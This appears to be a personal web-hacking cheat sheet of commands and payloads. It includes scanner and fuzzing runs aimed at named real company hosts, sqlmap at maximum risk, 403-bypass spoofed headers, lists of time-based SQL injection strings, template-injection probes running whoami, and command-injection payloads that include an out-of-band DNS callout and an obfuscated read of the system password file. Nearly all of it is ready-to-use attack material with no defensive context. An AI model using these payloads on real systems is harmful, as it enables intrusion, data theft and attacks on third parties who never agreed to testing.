# FUZZING & AUTOMATION VULN CHECK
nuclei -t "/root/nuclei-templates/technologies/*.yaml" -l domain.txt
nuclei -t "/root/nuclei-templates/misconfiguration/*.yaml" -u https://securisync.intermedia.net
ffuf -u "https://lawaklandvictim.vendhq.com/api/2.0/nav/FUZZ" -mr "root:x|Ubuntu" -w /root/Documents/directory_wordlist/dotpwn.txt
ffuf -u "https://account.criteo.com/auth/json/criteo/users/ums:ping+-c+10+127.0.0.1||file://FUZZ" -w /root/Documents/security/payload/directory_transversal/dotpwn.txt
gospider -s "https://api.employer.jora.com/" -o output -c 10 -d 1

# GRAB URLS & HTTPS CHECK
$ printf example.com | gau
$ cat domains.txt | gau
$ gau example.com
$ gau -o example-urls.txt example.com
$ gau -b png,jpg,gif example.com
$ cat domains.txt | httprobe -c 50
$ cat domains.txt | httprobe -p http:81 -p https:8443

# BYPASS 403 SERVER SIDE
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1:80
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: 127.0.0.1

X-Client-IP : 127.0.0.1
X-Host : 127.0.0.1
Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-IP: 127.0.0.1
X-True-IP: 127.0.0.1

# REMOVE NOICE BURPSUITE HISTORY
.*\.google\.com 
.*\.gstatic\.com
.*\.mozilla\.com
.*\.googleapis\.com
.*\.pki\.goog
.*\.raygun\.io
.*\.intercom\.io

# SQL INJECTION 
sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
sqlmap -u $url --forms --crawl=2 --dbs --ignore-code=401
| sleep 10
&& sleep 10
; sleep 10
{${sleep(20)}}
exec('sleep 5');
'xor(if(now()=sysdate(),sleep(10),0))or'
'xor(if(mid(database(),1,1)=0x41,sleep(63),0))or'
+(select*from(select(sleep(0)))a)+
'xor(select*from(select(0)))'
')) or sleep(5)='
;waitfor delay '0:0:10'--
);waitfor delay '0:0:10'--
';waitfor delay '0:0:10'--
";waitfor delay '0:0:10'--
');waitfor delay '0:0:10'--
");waitfor delay '0:0:10'--
));waitfor delay '0:0:10'--
' WAITFOR DELAY '0:0:10'--
';WAITFOR DELAY '0:0:10'-- 

# SERVER SIDE TEMPLATE INJECTION TEST
{{7*7}} ${7*7} <%= 7*7 %> ${{7*7}} #{7*7}

{{ [].class.base.subclasses() }} ${class.getClassLoader()} <%= system("whoami") %> ${{request}} #{selection.__${sel.code}__}

{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
${{<%[%'"}}%\.
{}{{}}{}}{7*7}{{}}}


# COMMAND INJECTION TEST
||ping+-c+10+127.0.0.1||
x||nslookup+x.burpcollaborator.net||
cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??

# DOWLOAD FILES > 1
xargs -n 1 curl -O < links.txt

export PYTHONWARNINGS="ignore:Unverified HTTPS request"


